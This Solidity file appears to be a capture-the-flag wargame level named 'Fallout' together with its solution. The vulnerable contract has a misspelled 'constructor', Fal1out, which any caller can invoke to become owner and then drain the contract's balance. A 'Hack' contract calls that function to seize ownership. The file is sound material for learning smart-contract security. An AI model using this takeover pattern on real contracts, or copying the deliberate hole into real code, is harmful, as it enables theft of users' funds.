
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

/**
Claim ownership of the contract below to complete this level.

  Things that might help

Solidity Remix IDE
**/
contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = payable(msg.sender);
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    payable(msg.sender).transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}

interface FalloutI {
  function owner() external view returns(address payable);
  function Fal1out() external payable;
}

contract Hack {

  FalloutI fallout;

  constructor(address _add){
    fallout = FalloutI(_add);
  }

  function checkOwner() public view returns(address payable) {
    return fallout.owner();
  }
  
  function hack() public payable {
   fallout.Fal1out{value: msg.value}();
  }

  
}
